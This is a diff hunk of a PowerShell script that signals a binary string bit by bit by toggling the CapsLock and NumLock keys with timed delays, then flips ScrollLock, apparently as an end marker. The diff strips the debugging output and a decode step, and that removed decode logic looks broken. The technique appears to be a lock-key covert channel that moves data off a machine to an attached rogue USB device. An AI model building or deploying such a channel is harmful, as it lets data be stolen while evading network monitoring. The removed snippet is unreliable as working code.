@@ -78,38 +78,13 @@ $originalScrollLockState = [Keyboard]::GetKeyState(0x91) -band 0x01
 foreach ($bit in $binaryData.ToCharArray()) {
     if ($bit -eq '1') {
         Toggle-Key -KeyName "CapsLock"
-        # After each toggle, print the state
-        Write-Host "CapsLock state: $([Keyboard]::GetKeyState(0x14))"
-        Write-Host "NumLock state: $([Keyboard]::GetKeyState(0x90))"
-        Write-Host "ScrollLock state: $([Keyboard]::GetKeyState(0x91))"
     
     } else {
         Toggle-Key -KeyName "NumLock"
-        
-        # After each toggle, print the state
-        Write-Host "CapsLock state: $([Keyboard]::GetKeyState(0x14))"
-        Write-Host "NumLock state: $([Keyboard]::GetKeyState(0x90))"
-        Write-Host "ScrollLock state: $([Keyboard]::GetKeyState(0x91))"
     }
 
     Start-Sleep -Milliseconds $Delay  # Adjust the delay dynamically
 }
-
-# Toggle CapsLock
-[Keyboard]::keybd_event(0x14, 0, 0, [UIntPtr]::Zero)  # Key down
-Write-Host "CapsLock state after toggle: $([Keyboard]::GetKeyState(0x14))"
-Start-Sleep -Milliseconds 100
-
-[Keyboard]::keybd_event(0x14, 0, [Keyboard]::KEYEVENTF_KEYUP, [UIntPtr]::Zero)  # Key up
-Start-Sleep -Milliseconds 100
-Write-Host "CapsLock state after toggle: $([Keyboard]::GetKeyState(0x14))"
-
-# Decode the binary back to characters for printing to console
-$decodedText = [System.Text.Encoding]::UTF8.GetString(
-    [System.Convert]::FromBase64String(
-        [string]::Join("", $binaryData -split "(?<=\G.{8})")
-    )
-)
 
 # Change Scroll Lock to the opposite of its original state
 Toggle-Key -KeyName "ScrollLock"  # Scroll Lock was ON, turn it OFF
